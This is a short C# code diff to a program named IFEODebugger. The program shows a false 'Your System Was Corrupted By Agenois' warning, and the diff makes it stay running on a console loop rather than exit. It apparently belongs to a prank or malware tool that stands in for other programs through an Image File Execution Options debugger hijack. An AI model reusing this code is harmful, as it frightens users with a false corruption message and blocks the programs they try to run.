@@ -12,7 +12,9 @@ namespace IFEODebugger
         static void Main(string[] args)
         {
             MessageBox.Show("Your System Was Corrupted By Agenois", ":)", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-            Environment.Exit(0);
+            string s = ""; //Temporary way to keep process alive, High CPU Usage
+            while (s != "kill")
+                s = Console.ReadLine();
         }
     }
 }
